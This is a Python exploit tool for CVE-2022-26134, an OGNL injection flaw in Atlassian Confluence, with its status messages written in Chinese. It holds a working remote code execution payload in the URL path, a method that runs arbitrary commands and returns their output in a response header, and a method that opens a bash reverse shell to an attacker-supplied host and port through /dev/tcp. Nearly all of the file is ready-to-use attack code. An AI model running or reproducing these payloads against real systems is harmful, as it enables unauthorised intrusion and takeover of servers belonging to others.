import requests
import argparse
from urllib.parse import urljoin, quote
import urllib3
import re
import click

class CVE_2022_26134:
    cmd = "echo QaxNB12138"
    payload = '/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("' + cmd + '").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/'
    
    def __init__(self, target, proxy):
        self.target = target
        self.proxy = proxy
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate"
        }
        self.timeout = 10
        self.verify = False
        self.allow_redirects = False

    def get_version(self):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, "/login.action")
            res_v = requests.get(url=url, timeout= self.timeout)
            if res_v.status_code == 200:
                ver = re.findall("<span id='footer-build-information'>.*</span>", res_v.text)
                if len(ver) >= 1:
                    version = ver[0].split("'>")[1].split("</")[0]
                    return version
                else:
                    return self.target

        except Exception as e:
            print(str(e))

    def check(self):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, quote(self.payload))            
            res = requests.get(url=url, headers=self.headers, verify=self.verify, timeout=self.timeout, allow_redirects=self.allow_redirects, proxies=self.proxy)
            if res.status_code == 302 and 'X-Cmd-Response' in res.headers:
                return f"[+] {self.target}存在CVE-2022-26134 RCE command:[echo QaxNB12138]\n[+] Command Result: {res.headers['X-Cmd-Response']}"
            else:
                return f"[-] {self.target}不存在confluence CVE-2022-26134 RCE"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
       
    def exploit(self, command):
        try:
            urllib3.disable_warnings()
            path = '/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("' + command + '").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/'
            url = urljoin(self.target, quote(path))
            res = requests.get(url=url, headers=self.headers, verify=self.verify, timeout=self.timeout, allow_redirects=self.allow_redirects, proxies=self.proxy)
            if res.status_code == 302 and 'X-Cmd-Response' in res.headers:
                return res.headers['X-Cmd-Response']
            else:
                return "Null"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"


    def reverse(self, lhost, lport):
        urllib3.disable_warnings()
        rev = "'bash','-c','bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'"
        payload = '${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(' + rev + ').start()")}/'
        print(quote(payload))
        url = urljoin(self.target, quote(payload))
        requests.get(url=url, verify=self.verify)
        return f"[*] 反弹shell命令已执行，请返回主机{lhost}查看结果!"


